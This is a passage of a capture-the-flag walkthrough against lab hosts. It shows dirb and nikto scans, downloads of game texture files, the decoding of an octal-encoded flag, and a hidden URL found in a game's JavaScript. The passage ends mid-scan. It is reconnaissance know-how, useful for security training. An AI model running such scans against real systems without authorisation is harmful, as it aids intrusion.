    _gaq.push(['_setAccount', 'UA-26274524-4']);
    _gaq.push(['_trackPageview']);
    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
    </script>
  </head>

  <body>
    <div id="step-1">
      <div id="global"></div>
      <div id="title">
      </div>
      <div id="menucontainer">
        <div id="menu">
          <div id="start">Start</div>
          <div id="s-controlType">Controls: Keyboard</div>
          <div id="s-quality">Quality: High</div>
          <div id="s-hud">HUD: On</div>
          <div id="s-godmode" style="display: none">Godmode: Off</div>
          <div id="s-credits">Credits</div>
        </div>
      </div>
    </div>
    <div id="step-2" style="display: none">
      <div id="ctrl-help">Click/Touch to continue.</div>
    </div>
    <div id="step-3" style="display: none">
      <div id="progressbar"></div>
    </div>
    <div id="step-4" style="display: none">
      <div id="overlay"></div>
      <div id="main"></div>
    </div>
    <div id="step-5" style="display: none">
      <div id="time"></div>
      <div id="ctrl-help">Click/Touch to continue.</div>
    </div>
    <div id="credits" style="display: none">
      <h3>Code</h3>
      <p><b>Concept and Development</b><br>Thibaut Despoulain (BKcore)</p>
      <p><b>Contributors</b><br>townxelliot<br>mahesh.kk</p>
      <p><b>Technologies</b><br>WebGL<br>JavaScript<br>CoffeeScript<br>Three.js<br>LeapMotion</p>
      <h3>Graphics</h3>
      <p><b>HexMKI base model</b><br>Charnel</p>
      <p><b>Track texture</b><br>Nobiax</p>
      <h4>Click anywhere to continue.</h4>
    </div>

    <div id="leapinfo" style="display: none"></div>

    <script src="libs/leap-0.4.1.min.js"></script>
    <script src="libs/Three.dev.js"></script>
    <script src="libs/ShaderExtras.js"></script>
    <script src="libs/postprocessing/EffectComposer.js"></script>
    <script src="libs/postprocessing/RenderPass.js"></script>
    <script src="libs/postprocessing/BloomPass.js"></script>
    <script src="libs/postprocessing/ShaderPass.js"></script>
    <script src="libs/postprocessing/MaskPass.js"></script>
    <script src="libs/Detector.js"></script>
    <script src="libs/Stats.js"></script>
    <script src="libs/DAT.GUI.min.js"></script>

    <script src="bkcore.coffee/controllers/TouchController.js"></script>
    <script src="bkcore.coffee/controllers/OrientationController.js"></script>
    <script src="bkcore.coffee/controllers/GamepadController.js"></script>

    <script src="bkcore.coffee/Timer.js"></script>
    <script src="bkcore.coffee/ImageData.js"></script>
    <script src="bkcore.coffee/Utils.js"></script>

    <script src="bkcore/threejs/RenderManager.js"></script>
    <script src="bkcore/threejs/Shaders.js"></script>
    <script src="bkcore/threejs/Particles.js"></script>
    <script src="bkcore/threejs/Loader.js"></script>

    <script src="bkcore/Audio.js"></script>

    <script src="bkcore/hexgl/HUD.js"></script>
    <script src="bkcore/hexgl/RaceData.js"></script>
    <script src="bkcore/hexgl/ShipControls.js"></script>
    <script src="bkcore/hexgl/ShipEffects.js"></script>
    <script src="bkcore/hexgl/CameraChase.js"></script>
    <script src="bkcore/hexgl/Gameplay.js"></script>

    <script src="bkcore/hexgl/tracks/Cityscape.js"></script>

    <script src="bkcore/hexgl/HexGL.js"></script>

    <script src="launch.js"></script>

  </body>
</html>
root@kali:~# dirb http://g4m35.ctf/H3x6L64m3/ /usr/share/wordlists/dirb/big.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Apr 28 11:28:07 2017
URL_BASE: http://g4m35.ctf/H3x6L64m3/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://g4m35.ctf/H3x6L64m3/ ----
+ http://g4m35.ctf/H3x6L64m3/LICENSE (CODE:200|SIZE:1085)                                                                                                                                                         
==> DIRECTORY: http://g4m35.ctf/H3x6L64m3/audio/                                                                                                                                                                  
==> DIRECTORY: http://g4m35.ctf/H3x6L64m3/css/                                                                                                                                                                    
==> DIRECTORY: http://g4m35.ctf/H3x6L64m3/libs/                                                                                                                                                                   
==> DIRECTORY: http://g4m35.ctf/H3x6L64m3/textures/                                                                                                                                                               
                                                                                                                                                                                                                  
---- Entering directory: http://g4m35.ctf/H3x6L64m3/audio/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://g4m35.ctf/H3x6L64m3/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://g4m35.ctf/H3x6L64m3/libs/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://g4m35.ctf/H3x6L64m3/textures/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Fri Apr 28 11:28:28 2017
DOWNLOADED: 20458 - FOUND: 1
root@kali:~# 
root@kali:~# nikto -C all -h http://g4m35.ctf/H3x6L64m3/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.167
+ Target Hostname:    g4m35.ctf
+ Target Port:        80
+ Start Time:         2017-04-27 08:55:18 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache
+ Server leaks inodes via ETags, header found with file /H3x6L64m3/, fields: 0x1419 0x54c31db0510c6 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3092: /H3x6L64m3/.git/index: Git Index file may contain directory listing information.
+ /H3x6L64m3/.git/HEAD: Git HEAD file found. Full repo details may be present.
+ /H3x6L64m3/.git/config: Git config file found. Infos about repo details may be present.
+ 26075 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2017-04-27 08:56:11 (GMT2) (53 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
root@kali:~# 

```

While looking at the textures game folder we find the following ones

```bash

root@kali:~# wget http://g4m35.ctf/H3x6L64m3/textures/skybox/dawnclouds/pz.jpg
--2017-04-28 11:36:45--  http://g4m35.ctf/H3x6L64m3/textures/skybox/dawnclouds/pz.jpg
Risoluzione di g4m35.ctf (g4m35.ctf)... 192.168.1.167
Connessione a g4m35.ctf (g4m35.ctf)|192.168.1.167|:80... connesso.
Richiesta HTTP inviata, in attesa di risposta... 200 OK
Lunghezza: 119017 (116K) [image/jpeg]
Salvataggio in: "pz.jpg"

pz.jpg                                               100%[=====================================================================================================================>] 116,23K  --.-KB/s    in 0,002s  

2017-04-28 11:36:45 (46,5 MB/s) - "pz.jpg" salvato [119017/119017]

root@kali:~# wget http://g4m35.ctf/H3x6L64m3/textures/skybox/dawnclouds/nz.jpg
--2017-04-28 11:36:56--  http://g4m35.ctf/H3x6L64m3/textures/skybox/dawnclouds/nz.jpg
Risoluzione di g4m35.ctf (g4m35.ctf)... 192.168.1.167
Connessione a g4m35.ctf (g4m35.ctf)|192.168.1.167|:80... connesso.
Richiesta HTTP inviata, in attesa di risposta... 200 OK
Lunghezza: 129611 (127K) [image/jpeg]
Salvataggio in: "nz.jpg"

nz.jpg                                               100%[=====================================================================================================================>] 126,57K  --.-KB/s    in 0,006s  

2017-04-28 11:36:57 (20,3 MB/s) - "nz.jpg" salvato [129611/129611]

root@kali:~# 

```

The content of the image is the following

```bash
\106\114\64\66\137\65\72\60\71\153\70\67\150\66\147\64\145\62\65\147\150\64\64\167\141\61\162\171\142\171\146\151\70\71\70\150\156\143\144\164
```
which decoded at http://munc.com/jseffects/asciiConverter.html with input
```bash
%106%114%64%66%137%65%72%60%71%153%70%67%150%66%147%64%145%62%65%147%150%64%64%167%141%61%162%171%142%171%146%151%70%71%70%150%156%143%144%164
```
leads to the following
```bash
FL46_5:09k87h6g4e25gh44wa1rybyfi898hncdt
```

Instead of trying to beat the game with the browser we try to list all js files and trying to find something interesting

```bash

root@kali:~# curl http://g4m35.ctf/H3x6L64m3/ | grep .js
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5145  100  5145    0     0      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      <p><b>Technologies</b><br>WebGL<br>JavaScript<br>CoffeeScript<br>Three.js<br>LeapMotion</p>
    <script src="libs/leap-0.4.1.min.js"></script>
    <script src="libs/Three.dev.js"></script>
    <script src="libs/ShaderExtras.js"></script>
    <script src="libs/postprocessing/EffectComposer.js"></script>
    <script src="libs/postprocessing/RenderPass.js"></script>
    <script src="libs/postprocessing/BloomPass.js"></script>
    <script src="libs/postprocessing/ShaderPass.js"></script>
    <script src="libs/postprocessing/MaskPass.js"></script>
    <script src="libs/Detector.js"></script>
    <script src="libs/Stats.js"></script>
    <script src="libs/DAT.GUI.min.js"></script>
    <script src="bkcore.coffee/controllers/TouchController.js"></script>
   283k      0 --:--:-- --:--:-- --:--:--  295k
    <script src="bkcore.coffee/controllers/OrientationController.js"></script>
    <script src="bkcore.coffee/controllers/GamepadController.js"></script>
    <script src="bkcore.coffee/Timer.js"></script>
    <script src="bkcore.coffee/ImageData.js"></script>
    <script src="bkcore.coffee/Utils.js"></script>
    <script src="bkcore/threejs/RenderManager.js"></script>
    <script src="bkcore/threejs/Shaders.js"></script>
    <script src="bkcore/threejs/Particles.js"></script>
    <script src="bkcore/threejs/Loader.js"></script>
    <script src="bkcore/Audio.js"></script>
    <script src="bkcore/hexgl/HUD.js"></script>
    <script src="bkcore/hexgl/RaceData.js"></script>
    <script src="bkcore/hexgl/ShipControls.js"></script>
    <script src="bkcore/hexgl/ShipEffects.js"></script>
    <script src="bkcore/hexgl/CameraChase.js"></script>
    <script src="bkcore/hexgl/Gameplay.js"></script>
    <script src="bkcore/hexgl/tracks/Cityscape.js"></script>
    <script src="bkcore/hexgl/HexGL.js"></script>
    <script src="launch.js"></script>
root@kali:~# 

```

As before the main Gameplay.js file can be a lucky bet, we open it and analyze it looking for interesting paths or information

```bash

root@kali:~# curl http://g4m35.ctf/H3x6L64m3/bkcore/hexgl/Gameplay.js
 /*
 * HexGL
 * @author Thibaut 'BKcore' Despoulain <http://bkcore.com>
 * @license This work is licensed under the Creative Commons Attribution-NonCommercial 3.0 Unported License. 
 *          To view a copy of this license, visit http://creativecommons.org/licenses/by-nc/3.0/.
 */

var bkcore = bkcore || {};
bkcore.hexgl = bkcore.hexgl || {};

bkcore.hexgl.Gameplay = function(opts)
{
	var self = this;

	this.startDelay = opts.hud == null ? 0 : 1000;
	this.countDownDelay = opts.hud == null ? 1000 : 1500;

	this.active = false;
	this.timer = new bkcore.Timer();
	this.modes = {
		'timeattack':null,
		'survival':null,
		'replay':null
	};
	this.mode = opts.mode == undefined || !(opts.mode in this.modes) ? "timeattack" : opts.mode;
	this.step = 0;

	this.hud = opts.hud;
	this.shipControls = opts.shipControls;
	this.cameraControls = opts.cameraControls;
	this.track = opts.track;
	this.analyser = opts.analyser;
	this.pixelRatio = opts.pixelRatio;

	this.previousCheckPoint = -1;

	this.results = {
		FINISH: 1,
		DESTROYED: 2,
		WRONGWAY: 3,
		REPLAY: 4,
		NONE: -1
	};
	this.result = this.results.NONE;

	this.lap = 1;
	this.lapTimes = [];
	this.lapTimeElapsed = 0;
	this.maxLaps = 3;
	this.score = null;
	this.finishTime = null;
	this.onFinish = opts.onFinish == undefined ? function(){console.log("FINISH");} : opts.onFinish;

	this.raceData = null;

	this.modes.timeattack = function()
	{
		self.raceData.tick(this.timer.time.elapsed);

		self.hud != null && self.hud.updateTime(self.timer.getElapsedTime());
		var cp = self.checkPoint();

		if(cp == self.track.checkpoints.start && self.previousCheckPoint == self.track.checkpoints.last)
		{
			self.previousCheckPoint = cp;
			var t = self.timer.time.elapsed;
			self.lapTimes.push(t - self.lapTimeElapsed);
			self.lapTimeElapsed = t;

			if(self.lap == this.maxLaps)
			{
				self.end(self.results.FINISH);
			}
			else
			{
				self.lap++;
				self.hud != null && self.hud.updateLap(self.lap, self.maxLaps);

				if(self.lap == self.maxLaps)
					self.hud != null && self.hud.display("Final lap", 0.5);
			}
		}
		else if(cp != -1 && cp != self.previousCheckPoint)
		{
			self.previousCheckPoint = cp;
			//self.hud.display("Checkpoint", 0.5);
		}

		if(self.shipControls.destroyed == true)
		{
			self.end(self.results.DESTROYED);
		}
	};

	this.modes.replay = function()
	{
		self.raceData.applyInterpolated(this.timer.time.elapsed);

		if(self.raceData.seek == self.raceData.last)
		{
			self.end(self.result.REPLAY);
		}
	};
}

bkcore.hexgl.Gameplay.prototype.simu = function()
{
	this.lapTimes = [92300, 91250, 90365];
	this.finishTime = this.lapTimes[0]+this.lapTimes[1]+this.lapTimes[2];
	if(this.hud != null) this.hud.display("Finish");
	this.step = 100;
	this.result = this.results.FINISH;
	this.shipControls.active = false;
}

bkcore.hexgl.Gameplay.prototype.start = function(opts)
{
	this.finishTime = null;
	this.score = null;
	this.lap = 1;

	this.shipControls.reset(this.track.spawn, this.track.spawnRotation);
	this.shipControls.active = false;

	this.previousCheckPoint = this.track.checkpoints.start;

	this.raceData = new bkcore.hexgl.RaceData(this.track.name, this.mode, this.shipControls);
	if(this.mode == 'replay')
	{
		this.cameraControls.mode = this.cameraControls.modes.ORBIT;
		if(this.hud != null) this.hud.messageOnly = true;

		try {
			var d = localStorage['race-'+this.track.name+'-replay'];
			if(d == undefined)
			{
				console.error('No replay data for '+'race-'+this.track.name+'-replay'+'.');
				return false;
			}
			this.raceData.import(
				JSON.parse(d)
			);
		}
		catch(e) { console.error('Bad replay format : '+e); return false; }
	}

	this.active = true;
	this.step = 0;
	this.timer.start();
	if(this.hud != null)
	{
		this.hud.resetTime();
		this.hud.display("Get ready", 1);
		this.hud.updateLap(this.lap, this.maxLaps);
	}
}

bkcore.hexgl.Gameplay.prototype.end = function(result)
{
	this.score = this.timer.getElapsedTime();
	this.finishTime = this.timer.time.elapsed;
	this.timer.start();
	this.result = result;

	this.shipControls.active = false;

	if(result == this.results.FINISH)
	{
		if(this.hud != null) this.hud.display("Finish");
		this.step = 100;
	}
	else if(result == this.results.DESTROYED)
	{
		if(this.hud != null) this.hud.display("http://t3rm1n4l.ctf");
		this.step = 100;
	}
}

bkcore.hexgl.Gameplay.prototype.update = function()
{
	if(!this.active) return;

	this.timer.update();
	
	if(this.step == 0 && this.timer.time.elapsed >= this.countDownDelay+this.startDelay)
	{
		if(this.hud != null) this.hud.display("3");
		this.step = 1;
	}
	else if(this.step == 1 && this.timer.time.elapsed >= 2*this.countDownDelay+this.startDelay)
	{
		if(this.hud != null) this.hud.display("2");
		this.step = 2;
	}
	else if(this.step == 2 && this.timer.time.elapsed >= 3*this.countDownDelay+this.startDelay)
	{
		if(this.hud != null) this.hud.display("1");
		this.step = 3;
	}
	else if(this.step == 3 && this.timer.time.elapsed >= 4*this.countDownDelay+this.startDelay)
	{
		if(this.hud != null) this.hud.display("Go", 0.5);
		this.step = 4;
		this.timer.start();
		
		if(this.mode != "replay")
			this.shipControls.active = true;
	}
	else if(this.step == 4)
	{
		this.modes[this.mode].call(this);
	}
	else if(this.step == 100 && this.timer.time.elapsed >= 2000)
	{
		this.active = false;
		this.onFinish.call(this);
	}
}

bkcore.hexgl.Gameplay.prototype.checkPoint = function()
{
	var x = Math.round(this.analyser.pixels.width/2 + this.shipControls.dummy.position.x * this.pixelRatio);
	var z = Math.round(this.analyser.pixels.height/2 + this.shipControls.dummy.position.z * this.pixelRatio);

	var color = this.analyser.getPixel(x, z);

	if(color.r == 255 && color.g == 255 && color.b < 250)
		return color.b;
	else
		return -1;
}
root@kali:~# 

```

Where we find the new address http://t3rm1n4l.ctf
We proceed to add it to the /etc/hosts file and study the new website

```bash

root@kali:~# cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

# CFT

192.168.1.167 t3rm1n4l.ctf

root@kali:~# 

```

Running nikto, dirb towards the new found website lead us to discover the term.php page

```bash

root@kali:~# nikto -C all -h http://t3rm1n4l.ctf
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.167
+ Target Hostname:    t3rm1n4l.ctf
+ Target Port:        80
+ Start Time:         2017-04-27 09:12:29 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server leaks inodes via ETags, header found with file /, fields: 0xd3 0x54c550ee22d56 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26075 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2017-04-27 09:13:15 (GMT2) (46 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
root@kali:~# dirb http://t3rm1n4l.ctf

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Apr 27 09:13:43 2017
URL_BASE: http://t3rm1n4l.ctf/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://t3rm1n4l.ctf/ ----
==> DIRECTORY: http://t3rm1n4l.ctf/css/                                                                                                                                                                           
+ http://t3rm1n4l.ctf/index.php (CODE:200|SIZE:690)                                                                                                                                                               
==> DIRECTORY: http://t3rm1n4l.ctf/js/                                                                                                                                                                            
==> DIRECTORY: http://t3rm1n4l.ctf/manual/                                                                                                                                                                        
+ http://t3rm1n4l.ctf/server-status (CODE:403|SIZE:222)                                                                                                                                                           
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/ ----
==> DIRECTORY: http://t3rm1n4l.ctf/manual/da/                                                                                                                                                                     
==> DIRECTORY: http://t3rm1n4l.ctf/manual/de/                                                                                                                                                                     
==> DIRECTORY: http://t3rm1n4l.ctf/manual/en/                                                                                                                                                                     
==> DIRECTORY: http://t3rm1n4l.ctf/manual/es/                                                                                                                                                                     
==> DIRECTORY: http://t3rm1n4l.ctf/manual/fr/                                                                                                                                                                     
==> DIRECTORY: http://t3rm1n4l.ctf/manual/images/                                                                                                                                                                 
+ http://t3rm1n4l.ctf/manual/index.html (CODE:200|SIZE:626)                                                                                                                                                       
==> DIRECTORY: http://t3rm1n4l.ctf/manual/ja/                                                                                                                                                                     
==> DIRECTORY: http://t3rm1n4l.ctf/manual/ko/                                                                                                                                                                     
==> DIRECTORY: http://t3rm1n4l.ctf/manual/style/                                                                                                                                                                  
==> DIRECTORY: http://t3rm1n4l.ctf/manual/tr/                                                                                                                                                                     
==> DIRECTORY: http://t3rm1n4l.ctf/manual/zh-cn/                                                                                                                                                                  
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/da/ ----
==> DIRECTORY: http://t3rm1n4l.ctf/manual/da/developer/                                                                                                                                                           
==> DIRECTORY: http://t3rm1n4l.ctf/manual/da/faq/                                                                                                                                                                 
==> DIRECTORY: http://t3rm1n4l.ctf/manual/da/howto/                                                                                                                                                               
+ http://t3rm1n4l.ctf/manual/da/index.html (CODE:200|SIZE:9041)                                                                                                                                                   
==> DIRECTORY: http://t3rm1n4l.ctf/manual/da/misc/                                                                                                                                                                
==> DIRECTORY: http://t3rm1n4l.ctf/manual/da/mod/                                                                                                                                                                 
==> DIRECTORY: http://t3rm1n4l.ctf/manual/da/programs/                                                                                                                                                            
==> DIRECTORY: http://t3rm1n4l.ctf/manual/da/ssl/                                                                                                                                                                 
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/de/ ----
==> DIRECTORY: http://t3rm1n4l.ctf/manual/de/developer/                                                                                                                                                           
==> DIRECTORY: http://t3rm1n4l.ctf/manual/de/faq/                                                                                                                                                                 
==> DIRECTORY: http://t3rm1n4l.ctf/manual/de/howto/                                                                                                                                                               
+ http://t3rm1n4l.ctf/manual/de/index.html (CODE:200|SIZE:9290)                                                                                                                                                   
==> DIRECTORY: http://t3rm1n4l.ctf/manual/de/misc/                                                                                                                                                                
==> DIRECTORY: http://t3rm1n4l.ctf/manual/de/mod/                                                                                                                                                                 
==> DIRECTORY: http://t3rm1n4l.ctf/manual/de/programs/                                                                                                                                                            
==> DIRECTORY: http://t3rm1n4l.ctf/manual/de/ssl/                                                                                                                                                                 
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/en/ ----
==> DIRECTORY: http://t3rm1n4l.ctf/manual/en/developer/                                                                                                                                                           
==> DIRECTORY: http://t3rm1n4l.ctf/manual/en/faq/                                                                                                                                                                 
==> DIRECTORY: http://t3rm1n4l.ctf/manual/en/howto/                                                                                                                                                               
+ http://t3rm1n4l.ctf/manual/en/index.html (CODE:200|SIZE:9206)                                                                                                                                                   
==> DIRECTORY: http://t3rm1n4l.ctf/manual/en/misc/                                                                                                                                                                
==> DIRECTORY: http://t3rm1n4l.ctf/manual/en/mod/                                                                                                                                                                 
==> DIRECTORY: http://t3rm1n4l.ctf/manual/en/programs/                                                                                                                                                            
==> DIRECTORY: http://t3rm1n4l.ctf/manual/en/ssl/                                                                                                                                                                 
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/es/ ----
==> DIRECTORY: http://t3rm1n4l.ctf/manual/es/developer/                                                                                                                                                           
==> DIRECTORY: http://t3rm1n4l.ctf/manual/es/faq/                                                                                                                                                                 
==> DIRECTORY: http://t3rm1n4l.ctf/manual/es/howto/                                                                                                                                                               
+ http://t3rm1n4l.ctf/manual/es/index.html (CODE:200|SIZE:9255)                                                                                                                                                   
==> DIRECTORY: http://t3rm1n4l.ctf/manual/es/misc/                                                                                                                                                                
==> DIRECTORY: http://t3rm1n4l.ctf/manual/es/mod/                                                                                                                                                                 
==> DIRECTORY: http://t3rm1n4l.ctf/manual/es/programs/                                                                                                                                                            
==> DIRECTORY: http://t3rm1n4l.ctf/manual/es/ssl/                                                                                                                                                                 
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/fr/ ----
==> DIRECTORY: http://t3rm1n4l.ctf/manual/fr/developer/                                                                                                                                                           
==> DIRECTORY: http://t3rm1n4l.ctf/manual/fr/faq/                                                                                                                                                                 
==> DIRECTORY: http://t3rm1n4l.ctf/manual/fr/howto/                                                                                                                                                               
+ http://t3rm1n4l.ctf/manual/fr/index.html (CODE:200|SIZE:9479)                                                                                                                                                   
==> DIRECTORY: http://t3rm1n4l.ctf/manual/fr/misc/                                                                                                                                                                
==> DIRECTORY: http://t3rm1n4l.ctf/manual/fr/mod/                                                                                                                                                                 
==> DIRECTORY: http://t3rm1n4l.ctf/manual/fr/programs/                                                                                                                                                            
==> DIRECTORY: http://t3rm1n4l.ctf/manual/fr/ssl/                                                                                                                                                                 
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/ja/ ----
==> DIRECTORY: http://t3rm1n4l.ctf/manual/ja/developer/                                                                                                                                                           
==> DIRECTORY: http://t3rm1n4l.ctf/manual/ja/faq/                                                                                                                                                                 
==> DIRECTORY: http://t3rm1n4l.ctf/manual/ja/howto/                                                                                                                                                               
+ http://t3rm1n4l.ctf/manual/ja/index.html (CODE:200|SIZE:9649)                                                                                                                                                   
==> DIRECTORY: http://t3rm1n4l.ctf/manual/ja/misc/                                                                                                                                                                
==> DIRECTORY: http://t3rm1n4l.ctf/manual/ja/mod/                                                                                                                                                                 
==> DIRECTORY: http://t3rm1n4l.ctf/manual/ja/programs/                                                                                                                                                            
==> DIRECTORY: http://t3rm1n4l.ctf/manual/ja/ssl/                                                                                                                                                                 
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/ko/ ----
==> DIRECTORY: http://t3rm1n4l.ctf/manual/ko/developer/                                                                                                                                                           
==> DIRECTORY: http://t3rm1n4l.ctf/manual/ko/faq/                                                                                                                                                                 
==> DIRECTORY: http://t3rm1n4l.ctf/manual/ko/howto/                                                                                                                                                               
+ http://t3rm1n4l.ctf/manual/ko/index.html (CODE:200|SIZE:8513)                                                                                                                                                   
==> DIRECTORY: http://t3rm1n4l.ctf/manual/ko/misc/                                                                                                                                                                
==> DIRECTORY: http://t3rm1n4l.ctf/manual/ko/mod/                                                                                                                                                                 
==> DIRECTORY: http://t3rm1n4l.ctf/manual/ko/programs/                                                                                                                                                            
==> DIRECTORY: http://t3rm1n4l.ctf/manual/ko/ssl/                                                                                                                                                                 
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/style/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/tr/ ----
==> DIRECTORY: http://t3rm1n4l.ctf/manual/tr/developer/                                                                                                                                                           
==> DIRECTORY: http://t3rm1n4l.ctf/manual/tr/faq/                                                                                                                                                                 
==> DIRECTORY: http://t3rm1n4l.ctf/manual/tr/howto/                                                                                                                                                               
+ http://t3rm1n4l.ctf/manual/tr/index.html (CODE:200|SIZE:9416)                                                                                                                                                   
==> DIRECTORY: http://t3rm1n4l.ctf/manual/tr/misc/                                                                                                                                                                
==> DIRECTORY: http://t3rm1n4l.ctf/manual/tr/mod/                                                                                                                                                                 
==> DIRECTORY: http://t3rm1n4l.ctf/manual/tr/programs/                                                                                                                                                            
==> DIRECTORY: http://t3rm1n4l.ctf/manual/tr/ssl/                                                                                                                                                                 
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/zh-cn/ ----
==> DIRECTORY: http://t3rm1n4l.ctf/manual/zh-cn/developer/                                                                                                                                                        
==> DIRECTORY: http://t3rm1n4l.ctf/manual/zh-cn/faq/                                                                                                                                                              
==> DIRECTORY: http://t3rm1n4l.ctf/manual/zh-cn/howto/                                                                                                                                                            
+ http://t3rm1n4l.ctf/manual/zh-cn/index.html (CODE:200|SIZE:8884)                                                                                                                                                
==> DIRECTORY: http://t3rm1n4l.ctf/manual/zh-cn/misc/                                                                                                                                                             
==> DIRECTORY: http://t3rm1n4l.ctf/manual/zh-cn/mod/                                                                                                                                                              
==> DIRECTORY: http://t3rm1n4l.ctf/manual/zh-cn/programs/                                                                                                                                                         
==> DIRECTORY: http://t3rm1n4l.ctf/manual/zh-cn/ssl/                                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/da/developer/ ----
+ http://t3rm1n4l.ctf/manual/da/developer/index.html (CODE:200|SIZE:5892)                                                                                                                                         
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/da/faq/ ----
+ http://t3rm1n4l.ctf/manual/da/faq/index.html (CODE:200|SIZE:3602)                                                                                                                                               
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/da/howto/ ----
+ http://t3rm1n4l.ctf/manual/da/howto/index.html (CODE:200|SIZE:6962)                                                                                                                                             
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/da/misc/ ----
+ http://t3rm1n4l.ctf/manual/da/misc/index.html (CODE:200|SIZE:5106)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/da/mod/ ----
+ http://t3rm1n4l.ctf/manual/da/mod/index.html (CODE:200|SIZE:22377)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/da/programs/ ----
+ http://t3rm1n4l.ctf/manual/da/programs/index.html (CODE:200|SIZE:6897)                                                                                                                                          
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/da/ssl/ ----
+ http://t3rm1n4l.ctf/manual/da/ssl/index.html (CODE:200|SIZE:5049)                                                                                                                                               
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/de/developer/ ----
+ http://t3rm1n4l.ctf/manual/de/developer/index.html (CODE:200|SIZE:5892)                                                                                                                                         
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/de/faq/ ----
+ http://t3rm1n4l.ctf/manual/de/faq/index.html (CODE:200|SIZE:3602)                                                                                                                                               
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/de/howto/ ----
+ http://t3rm1n4l.ctf/manual/de/howto/index.html (CODE:200|SIZE:6962)                                                                                                                                             
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/de/misc/ ----
+ http://t3rm1n4l.ctf/manual/de/misc/index.html (CODE:200|SIZE:5106)                                                                                                                                              
                                                                                                                                                                                                                  
